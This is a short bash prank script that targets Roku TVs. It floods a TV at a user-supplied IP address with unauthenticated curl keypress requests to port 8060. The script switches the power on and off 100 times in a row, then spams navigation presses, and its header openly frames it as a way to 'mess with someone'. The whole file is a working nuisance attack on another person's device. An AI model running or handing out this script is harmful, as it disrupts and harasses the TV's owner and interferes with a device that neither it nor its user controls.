#!/bin/bash
# How to mess with someone who has a Roku TV 101

# Function to handle curl requests
send_command() {
  echo "Sending command: $1"
  curl -d '' "http://$ip:8060/keypress/$1"
}

# Function to repeat a command sequence
repeat_commands() {
  echo "Repeating commands sequence: ${@}"
  for i in {1..100}
  do
    for command in "${@}"
    do
      send_command "$command"
    done
  done
}

# Ask for the IP address
read -p "Enter the IP address: " ip

# Start of the script
commands=("powerOn" "powerOff" "powerOn" "powerOff")
repeat_commands "${commands[@]}"

send_command "powerOn"
send_command "Home"

commands=("left" "down")
repeat_commands "${commands[@]}"

echo "Can we still be friends?"

